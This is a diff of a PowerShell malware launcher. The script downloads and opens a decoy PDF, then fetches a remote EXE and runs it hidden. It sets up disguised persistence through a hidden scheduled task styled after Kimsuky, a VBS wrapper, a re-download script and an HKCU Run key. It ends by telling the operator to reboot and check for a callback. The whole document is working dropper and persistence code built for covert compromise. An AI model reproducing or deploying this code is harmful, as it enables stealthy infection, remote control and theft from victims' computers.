@@ -1,13 +1,16 @@
-# launcher.ps1 - REBOOT-FIXED: explicit principal + AtLogon + reliable trigger
+# launcher.ps1 - schtasks.exe + persistent folder + AtLogon (should survive reboot now)
 $ErrorActionPreference = 'Continue'
-
-$cache = "$env:APPDATA\Microsoft\Windows\Caches"
-if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
 
 function log($msg) { 
     $timestamp = Get-Date -Format "HH:mm:ss"
     Write-Host "[$timestamp] $msg" -ForegroundColor Cyan
 }
+
+$persistBase = "$env:APPDATA\Microsoft\Windows\Libraries"
+if (-not (Test-Path $persistBase)) { New-Item -ItemType Directory -Path $persistBase -Force | Out-Null }
+
+$cache = "$env:APPDATA\Microsoft\Windows\Caches"
+if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
 
 log "Launcher started"
 
@@ -21,69 +24,86 @@ $exePath = "$cache\helper.exe"
 
 $headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
 
-# PDF download + open (keep working)
-log "Downloading PDF..."
-try { 
-    Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing -TimeoutSec 15 
-    log "PDF OK"
-} catch { log "PDF failed" }
-if (Test-Path $pdfPath) {
+log "Downloading PDF + EXE..."
+try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
+try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing } catch {}
+
+if (Test-Path $pdfPath) { 
     try { Start-Process $pdfPath -Verb Open } catch { & rundll32 url.dll,FileProtocolHandler $pdfPath }
 }
 
-# EXE download + launch
-log "Downloading EXE..."
-try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing } catch {}
 Start-Sleep -Seconds (Get-Random -Min 20 -Max 40)
+
 try {
     $wsh = New-Object -ComObject WScript.Shell
     $wsh.Run("`"$exePath`"", 0, $false)
 } catch { Start-Process $exePath -WindowStyle Hidden }
 
-# === FIXED PERSISTENCE FOR REBOOT ===
-log "Setting up reboot-proof persistence..."
-$randFolder = [System.IO.Path]::GetRandomFileName()
-$persistDir = "$env:TEMP\$randFolder"
-New-Item -ItemType Directory -Path $persistDir -Force | Out-Null
-
-$vbsPath = "$persistDir\update.vbs"
-$syncPath = "$persistDir\sync.ps1"
-$taskName = "WindowsUpdateCache-$(Get-Random -Min 100000 -Max 999999)"
+# === KIMSUKY-STYLE PERSISTENCE WITH schtasks.exe ===
+log "Setting up schtasks persistence..."
+$randName = "CacheLib-$(Get-Random -Min 100000 -Max 999999)"
+$vbsPath = "$persistBase\$randName.vbs"
+$syncPath = "$persistBase\$randName.ps1"
+$taskName = "Windows Library Update Task $randName"
 
 $vbsContent = @"
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File ""$syncPath""", 0, False
+WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File `"$syncPath`"", 0, False
 "@
 $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force
 
 $syncContent = @"
 `$ErrorActionPreference = 'SilentlyContinue'
-`$cache = "`$env:APPDATA\Microsoft\Windows\Caches"
+`$cache = `"$cache`"
 if (-not (Test-Path `$cache)) { New-Item -ItemType Directory -Path `$cache -Force | Out-Null }
-`$exeUrl = "$exeUrl"
-`$exePath = "`$cache\helper.exe"
+`$exeUrl = `"$exeUrl`"
+`$exePath = `"$exePath`"
 if (-not (Test-Path `$exePath) -or ((Get-Item `$exePath).Length -lt 100000)) {
     try { Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing } catch {}
 }
 try {
     `$wsh = New-Object -ComObject WScript.Shell
-    `$wsh.Run("`"`$exePath`"", 0, `$false)
+    `$wsh.Run(`"`$exePath`", 0, `$false)
 } catch { Start-Process `$exePath -WindowStyle Hidden }
 "@
 $syncContent | Out-File -FilePath $syncPath -Encoding UTF8 -Force
 
-# Task with explicit user principal + AtLogon + Once trigger
-$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
-$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "`"$vbsPath`""
-$trigger1 = New-ScheduledTaskTrigger -AtLogon
-$trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30)
-$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 0)
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger1,$trigger2 -Principal $principal -Settings $settings -Force | Out-Null
+# Create task with schtasks.exe (AtLogon + repeat)
+$xml = @"
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo><Date>$(Get-Date -Format "yyyy-MM-ddTHH:mm:ss")</Date></RegistrationInfo>
+  <Triggers>
+    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
+    <TimeTrigger><StartBoundary>$(Get-Date -Format "yyyy-MM-ddTHH:mm:ss")</StartBoundary><Enabled>true</Enabled></TimeTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author"><UserId>$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType></Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstances>IgnoreNew</MultipleInstances>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyForNetworkAvailable>false</RunOnlyForNetworkAvailable>
+    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd></IdleSettings>
+    <Hidden>true</Hidden>
+  </Settings>
+  <Actions Context="Author">
+    <Exec><Command>wscript.exe</Command><Arguments>"$vbsPath"</Arguments></Exec>
+  </Actions>
+</Task>
+"@
+$xml | Out-File -FilePath "$env:TEMP\task.xml" -Encoding UTF8 -Force
+
+schtasks.exe /Create /TN "$taskName" /XML "$env:TEMP\task.xml" /F | Out-Null
+Remove-Item "$env:TEMP\task.xml" -Force -ErrorAction SilentlyContinue
 
 # HKCU Run backup
 $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 Set-ItemProperty -Path $runKey -Name $taskName -Value "wscript.exe `"$vbsPath`"" -Type String -Force
 
-log "Persistence registered - Task: $taskName (AtLogon + Once)"
+log "Persistence registered - Task: $taskName"
 Start-Process wscript.exe -ArgumentList $vbsPath -WindowStyle Hidden
-log "Launcher finished"
+log "Launcher finished - reboot and check for callback in <90 seconds"
